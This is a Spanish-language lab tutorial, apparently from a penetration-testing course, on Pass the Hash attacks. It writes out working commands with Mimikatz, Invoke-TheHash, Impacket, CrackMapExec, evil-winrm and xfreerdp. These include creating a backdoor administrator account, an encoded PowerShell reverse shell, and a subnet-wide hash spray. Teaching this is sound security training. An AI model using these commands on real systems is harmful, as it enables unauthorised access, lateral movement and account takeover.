Un [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack es una técnica donde un atacante usa un hash de contraseña en lugar de la contraseña en texto plano para autenticarse. El atacante no necesita descifrar el hash para obtener la contraseña en texto claro. Los ataques PtH explotan el protocolo de autenticación, ya que el hash de la contraseña permanece estático para cada sesión hasta que se cambie la contraseña.

Como se discutió en las secciones anteriores, el atacante debe tener privilegios administrativos o privilegios particulares en la máquina objetivo para obtener un hash de contraseña. Los hashes se pueden obtener de varias maneras, incluyendo:

- Volcando la base de datos SAM local desde un host comprometido.
- Extrayendo hashes de la base de datos NTDS (ntds.dit) en un Domain Controller.
- Extrayendo los hashes de la memoria (lsass.exe).

Supongamos que obtenemos el hash de la contraseña (`64F12CDDAA88057E06A81B54E73B949B`) para la cuenta `julio` del dominio `inlanefreight.htb`. Veamos cómo podemos realizar ataques Pass the Hash desde máquinas Windows y Linux.

**Nota:** Las herramientas que usaremos están ubicadas en el directorio C:\tools en el host objetivo. Una vez que inicies la máquina y completes los ejercicios, puedes usar las herramientas en ese directorio. Este laboratorio contiene dos máquinas, tendrás acceso a una (MS01), y desde allí, te conectarás a la segunda máquina (DC01).

---

## Windows NTLM Introduction

[Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) de Microsoft es un conjunto de protocolos de seguridad que autentica las identidades de los usuarios al mismo tiempo que protege la integridad y confidencialidad de sus datos. NTLM es una solución de inicio de sesión único (SSO) que utiliza un protocolo de desafío-respuesta para verificar la identidad del usuario sin que este proporcione una contraseña.

A pesar de sus fallas conocidas, NTLM todavía se usa comúnmente para garantizar la compatibilidad con clientes y servidores heredados, incluso en sistemas modernos. Mientras que Microsoft continúa apoyando NTLM, Kerberos se ha convertido en el mecanismo de autenticación predeterminado en Windows 2000 y dominios de Active Directory (AD) subsiguientes.

Con NTLM, las contraseñas almacenadas en el servidor y en el controlador de dominio no están "saladas", lo que significa que un adversario con un hash de contraseña puede autenticar una sesión sin conocer la contraseña original. A esto lo llamamos un `Pass the Hash (PtH) Attack`.

---

## Pass the Hash with Mimikatz (Windows)

La primera herramienta que usaremos para realizar un ataque Pass the Hash es [Mimikatz](https://github.com/gentilkiwi). Mimikatz tiene un módulo llamado `sekurlsa::pth` que nos permite realizar un ataque Pass the Hash iniciando un proceso utilizando el hash de la contraseña del usuario. Para usar este módulo, necesitaremos lo siguiente:

- `/user` - El nombre de usuario que queremos suplantar.
- `/rc4` o `/NTLM` - Hash NTLM de la contraseña del usuario.
- `/domain` - Dominio al que pertenece el usuario a suplantar. En el caso de una cuenta de usuario local, podemos usar el nombre de la computadora, localhost o un punto (.).
- `/run` - El programa que queremos ejecutar con el contexto del usuario (si no se especifica, lanzará cmd.exe).

### Pass the Hash from Windows Using Mimikatz:

```r
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

Ahora podemos usar cmd.exe para ejecutar comandos en el contexto del usuario. Para este ejemplo, `julio` puede conectarse a una carpeta compartida llamada `julio` en el DC.

![text](https://academy.hackthebox.com/storage/modules/147/pth_julio.jpg)

---

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

Otra herramienta que podemos usar para realizar ataques Pass the Hash en Windows es [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). Esta herramienta es una colección de funciones de PowerShell para realizar ataques Pass the Hash con WMI y SMB. Las conexiones WMI y SMB se acceden a través de .NET TCPClient. La autenticación se realiza pasando un hash NTLM al protocolo de autenticación NTLMv2. No se requieren privilegios de administrador local en el lado del cliente, pero el usuario y el hash que usamos para autenticarnos deben tener derechos administrativos en la computadora objetivo. Para este ejemplo, usaremos el usuario `julio` y el hash `64F12CDDAA88057E06A81B54E73B949B`.

Al usar `Invoke-TheHash`, tenemos dos opciones: ejecución de comandos SMB o WMI. Para usar esta herramienta, necesitamos especificar los siguientes parámetros para ejecutar comandos en la computadora objetivo:

- `Target` - Nombre de host o dirección IP del objetivo.
- `Username` - Nombre de usuario para la autenticación.
- `Domain` - Dominio para la autenticación. Este parámetro no es necesario con cuentas locales o al usar el @dominio después del nombre de usuario.
- `Hash` - Hash de la contraseña NTLM para la autenticación. Esta función aceptará el formato LM:NTLM o NTLM.
- `Command` - Comando para ejecutar en el objetivo. Si no se especifica un comando, la función verificará si el nombre de usuario y el hash tienen acceso a WMI en el objetivo.

El siguiente comando utilizará el método SMB para la ejecución de comandos para crear un nuevo usuario llamado mark y agregar el usuario al grupo de Administradores.

### Invoke-TheHash with SMB

```r
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

También podemos obtener una conexión de shell inverso en la máquina objetivo. Si no estás familiarizado con los shells inversos, revisa el [Shells & Payloads](https://academy.hackthebox.com/module/details/115) módulo en HTB Academy.

Para obtener un shell inverso, necesitamos iniciar nuestro listener usando Netcat en nuestra máquina Windows, que tiene la dirección IP 172.16.1.5. Usaremos el puerto 8001 para esperar la conexión.

### Netcat Listener

```r
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...
```

Para crear un simple shell inverso usando PowerShell, podemos visitar [https://www.revshells.com/](https://www.revshells.com/), establecer nuestra IP `172.16.1.5` y puerto `8001`, y seleccionar la opción `PowerShell #3 (Base64)`, como se muestra en la siguiente imagen.

![text](https://academy.hackthebox.com/storage/modules/147/rshellonline.jpg)

Ahora podemos ejecutar `

Invoke-TheHash` para ejecutar nuestro script de shell inverso de PowerShell en la computadora objetivo. Nota que en lugar de proporcionar la dirección IP, que es `172.16.1.10`, usaremos el nombre de la máquina `DC01` (cualquiera de los dos funcionaría).

### Invoke-TheHash with WMI

```r
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01
```

El resultado es una conexión de shell inverso desde el host DC01 (172.16.1.10).

![text](https://academy.hackthebox.com/storage/modules/147/pth_invoke_the_hash.jpg)

---

## Pass the Hash with Impacket (Linux)

[Impacket](https://github.com/SecureAuthCorp/impacket) tiene varias herramientas que podemos usar para diferentes operaciones, como `Command Execution` y `Credential Dumping`, `Enumeration`, etc. Para este ejemplo, realizaremos la ejecución de comandos en la máquina objetivo usando `PsExec`.

### Pass the Hash with Impacket PsExec

```r
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Hay varias otras herramientas en el toolkit de Impacket que podemos usar para la ejecución de comandos usando ataques Pass the Hash, como:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

---

## Pass the Hash with CrackMapExec (Linux)

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) es una herramienta de post-explotación que ayuda a automatizar la evaluación de la seguridad de grandes redes de Active Directory. Podemos usar CrackMapExec para intentar autenticar en algunos o todos los hosts en una red buscando un host donde podamos autenticarnos con éxito como administrador local. Este método también se llama "Password Spraying" y se cubre en profundidad en el módulo Active Directory Enumeration & Attacks. Ten en cuenta que este método puede bloquear cuentas de dominio, así que ten en cuenta la política de bloqueo de cuentas del dominio objetivo y asegúrate de usar el método de cuenta local, que intentará solo un intento de inicio de sesión en un host en un rango dado usando las credenciales proporcionadas si esa es tu intención.

### Pass the Hash with CrackMapExec

```r
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

Si queremos realizar las mismas acciones pero intentar autenticarnos en cada host en un subred usando el hash de la contraseña del administrador local, podríamos agregar `--local-auth` a nuestro comando. Este método es útil si obtenemos un hash de administrador local volcando la base de datos SAM local en un host y queremos verificar cuántos (si es que hay alguno) otros hosts podemos acceder debido a la reutilización de la contraseña del administrador local. Si vemos `Pwn3d!`, significa que el usuario es un administrador local en la computadora objetivo. Podemos usar la opción `-x` para ejecutar comandos. Es común ver la reutilización de contraseñas contra muchos hosts en la misma subred. Las organizaciones a menudo usan imágenes doradas con la misma contraseña de administrador local o configuran esta contraseña igual en varios hosts para facilitar la administración. Si nos encontramos con este problema en un compromiso del mundo real, una gran recomendación para el cliente es implementar la [Local Administrator Password Solution (

LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899), que randomiza la contraseña del administrador local y se puede configurar para que gire en un intervalo fijo.

### CrackMapExec - Command Execution

```r
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```

Revisa la [CrackMapExec documentation Wiki](https://wiki.porchetta.industries/) para aprender más sobre las extensas características de la herramienta.

---

## Pass the Hash with evil-winrm (Linux)

[evil-winrm](https://github.com/Hackplayers/evil-winrm) es otra herramienta que podemos usar para autenticarnos utilizando el ataque Pass the Hash con PowerShell remoting. Si SMB está bloqueado o no tenemos derechos administrativos, podemos usar este protocolo alternativo para conectarnos a la máquina objetivo.

### Pass the Hash with evil-winrm

```r
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Nota:** Al usar una cuenta de dominio, necesitamos incluir el nombre del dominio, por ejemplo: administrator@inlanefreight.htb

---

## Pass the Hash with RDP (Linux)

Podemos realizar un ataque RDP PtH para obtener acceso GUI al sistema objetivo usando herramientas como `xfreerdp`.

Hay algunas advertencias para este ataque:

- `Restricted Admin Mode`, que está deshabilitado por defecto, debe estar habilitado en el host objetivo; de lo contrario, se presentará el siguiente error:

![](https://academy.hackthebox.com/storage/modules/147/rdp_session-4.png)

Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin` (REG_DWORD) bajo `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` con el valor de 0. Se puede hacer usando el siguiente comando:

### Enable Restricted Admin Mode to Allow PtH

```r
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![](https://academy.hackthebox.com/storage/modules/147/rdp_session-5.png)

Una vez que se agrega la clave de registro, podemos usar `xfreerdp` con la opción `/pth` para obtener acceso RDP:

### Pass the Hash Using RDP

```r
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```

![](https://academy.hackthebox.com/storage/modules/147/rdp_session_new.jpg)

---

## UAC Limits Pass the Hash for Local Accounts

UAC (User Account Control) limita la capacidad de los usuarios locales para realizar operaciones de administración remota. Cuando la clave de registro `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` está establecida en 0, significa que la cuenta de administrador local incorporada (RID-500, "Administrator") es la única cuenta local permitida para realizar tareas de administración remota. Configurarlo en 1 permite también a los otros administradores locales.

**Nota:** Hay una excepción, si la clave de registro `FilterAdministratorToken` (deshabilitada por defecto) está habilitada (valor 1), la cuenta RID 500 (incluso si está renombrada) está inscrita en la protección UAC. Esto significa que PtH remoto fallará contra la máquina cuando use esa cuenta.

Estas configuraciones son solo para cuentas administrativas locales. Si obtenemos acceso a una cuenta de dominio con derechos administrativos en una computadora, aún podemos usar Pass the Hash con esa computadora. Si quieres aprender más sobre LocalAccountTokenFilterPolicy, puedes leer la publicación del blog de Will Schroeder [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167).

---

## Next Steps

En esta sección, aprendimos cómo usar el hash NTLM (RC4-HMAC) de la contraseña de un usuario para realizar un ataque Pass the Hash (PtH) y movernos lateralmente en una red objetivo, pero esa no es la única forma en que podemos movernos lateralmente. En la siguiente sección, aprenderemos cómo abusar del protocolo Kerberos para movernos lateralmente y autenticarnos como diferentes usuarios.